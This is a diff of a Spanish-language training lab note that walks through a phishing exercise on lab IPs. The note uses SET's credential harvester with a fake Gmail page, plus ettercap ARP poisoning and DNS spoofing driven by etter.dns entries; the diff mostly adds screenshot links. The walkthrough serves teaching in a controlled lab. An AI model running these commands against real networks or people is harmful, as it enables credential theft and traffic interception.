@@ -1,21 +1,12 @@
 ---
-title: "📖 Práctica: Ingeniería Social y Campañas de Phishing"
+title: "🎣 Ataque de Phishing con SET"
 aliases:
-  - Ingeniería Social y Campañas de Phishing
-  - PoC ingenieria-social
+  - 🎣 Ataque de Phishing con SET
 tags:
   - ifct0109/pocs
-  - conceptos-fundamentales
-  - ingenieria-social
+  - conceptos
   - phishing
-  - osint
----
-
-# 📖 Práctica: Ingeniería Social y Campañas de Phishing
-
-> [!abstract] Resumen del Laboratorio
-> Módulo de Conceptos Fundamentales del Certificado IFCT0109: análisis de mecanismos base de redes, inspección de protocolos, desarrollo de pruebas de concepto e interactividad con herramientas de diagnóstico y auditoría técnica.
-
+  - ingenieria-social
 ---
 
 # 🎣 Ataque de Phishing con SET
@@ -90,7 +81,11 @@ La propia Kali Linux tiene utilidades para llevar a cabo ataques por ingeniería
 sudo setoolkit
 ```
 
+![Iniciar setoolkit](../../../archivos_descargados/imagenes/conceptos_fundamentales/phishing_images/media/image1.png)
+
 Aparecerá el menú principal de SET:
+
+![Menú principal de SET](../../../archivos_descargados/imagenes/conceptos_fundamentales/phishing_images/media/image2.png)
 
 ### 📋 Paso 2: Social-Engineering Attacks
 
@@ -100,6 +95,8 @@ Vamos al menú **1) Social-Engineering Attacks** y entraríamos en el siguiente 
 1
 ```
 
+![Menú Social Engineering](../../../archivos_descargados/imagenes/conceptos_fundamentales/phishing_images/media/image3.png)
+
 ### 🌐 Paso 3: Website Attack Vectors
 
 Vamos ahora a **2) Website Attack Vectors**
@@ -107,6 +104,8 @@ Vamos ahora a **2) Website Attack Vectors**
 ```bash
 2
 ```
+
+![Website Attack Vectors](../../../archivos_descargados/imagenes/conceptos_fundamentales/phishing_images/media/image4.png)
 
 #### 🎯 Tipos de Ataques Disponibles:
 
@@ -132,6 +131,8 @@ Elegimos la opción **3) Credential Harvester Attack Method**
 3
 ```
 
+![Credential Harvester](../../../archivos_descargados/imagenes/conceptos_fundamentales/phishing_images/media/image5.png)
+
 ### 📝 Paso 5: Seleccionar Método Web Template
 
 A continuación, vamos a elegir una plantilla creada, pero podríamos clonar un sitio existente seleccionando la opción 2.
@@ -146,6 +147,8 @@ Elegimos la opción **1) Web Templates**
 
 Nos pregunta la IP del equipo que hará como servidor web.
 
+![IP del servidor](../../../archivos_descargados/imagenes/conceptos_fundamentales/phishing_images/media/image6.png)
+
 #### 🐉 En Kali Linux:
 
 Introduce la IP de Kali (en nuestro caso: `10.0.0.6`)
@@ -158,11 +161,15 @@ Introduce la IP de Kali (en nuestro caso: `10.0.0.6`)
 
 Y elegimos una plantilla de Google.
 
+![Seleccionar plantilla Gmail](../../../archivos_descargados/imagenes/conceptos_fundamentales/phishing_images/media/image7.png)
+
 Seleccionamos la opción de **Google** (normalmente opción 2 o 3, dependiendo de la versión).
 
 ### ✅ Paso 8: Servidor Web Activo
 
 En la siguiente pantalla pulsamos **Enter**, y generará el servidor web con la plantilla de Gmail y se queda a la espera de conexiones y credenciales.
+
+![Servidor web activo](../../../archivos_descargados/imagenes/conceptos_fundamentales/phishing_images/media/image8.png)
 
 > [!warning] 🎯 Estado actual:
 >
@@ -182,6 +189,8 @@ http://10.0.0.6
 
 Accedemos al servidor web y veremos cómo ahora hay una web similar a Gmail:
 
+![Sitio falso de Gmail](../../../archivos_descargados/imagenes/conceptos_fundamentales/phishing_images/media/image9.png)
+
 ### 🔑 Paso 10: Captura de Credenciales
 
 Sólo hay que introducir credenciales para ver cómo en Kali se reflejan dichas credenciales.
@@ -197,6 +206,8 @@ Introduce cualquier email y contraseña en el formulario falso de Gmail.
 * Password: `password123`
 
 En Kali verás aparecer las credenciales capturadas:
+
+![Credenciales capturadas](../../../archivos_descargados/imagenes/conceptos_fundamentales/phishing_images/media/image10.png)
 
 #### ✅ Resultado:
 
@@ -240,6 +251,8 @@ gmail.com      A   10.0.0.6
 *.gmail.com    A   10.0.0.6
 www.gmail.com  A   10.0.0.6
 ```
+
+![Configuración etter.dns](../../../archivos_descargados/imagenes/conceptos_fundamentales/phishing_images/media/image11.png)
 
 #### 📋 Explicación:
 
@@ -299,7 +312,11 @@ sudo ettercap -T -q -i eth0 -M arp:remote -P dns_spoof //10.0.0.1// //10.0.0.12/
 
 **Respetar las barras**
 
+![Comando ettercap](../../../archivos_descargados/imagenes/conceptos_fundamentales/phishing_images/media/image12.png)
+
 Ettercap comenzará el ataque MITM y DNS spoofing:
+
+![Ettercap ejecutándose](../../../archivos_descargados/imagenes/conceptos_fundamentales/phishing_images/media/image13.png)
 
 ### ✅ Paso 4: Verificar el Ataque
 
@@ -445,9 +462,3 @@ arp -d
 ```
 
 * Cerrar y reabrir el navegador
-
----
-
-## 🔗 Enlaces y Referencias
-* 🗂️ [[02 - MODULOS/05 - Prácticas (PoCs)|Catálogo General de Prácticas (PoCs)]]
-* 🏠 [[00 - INDICE|Inicio del Vault]]
